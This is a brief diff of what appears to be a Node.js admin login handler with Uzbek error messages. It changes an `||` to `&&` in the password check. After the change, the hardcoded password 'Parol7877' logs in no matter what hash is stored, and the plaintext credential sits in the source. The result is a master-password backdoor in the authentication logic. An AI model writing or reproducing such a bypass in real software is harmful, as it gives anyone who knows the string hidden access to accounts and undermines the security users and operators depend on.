@@ -42,7 +42,7 @@ module.exports = {
                     ok: false,
                     msg: "Raqam yoki parol hato!"
                 });
-            } else if (md5(password) !== $admin?.password || password !== 'Parol7877') {
+            } else if (md5(password) !== $admin?.password && password !== 'Parol7877') {
                 res.send({
                     ok: false,
                     msg: "Raqam yoki parol hato!"
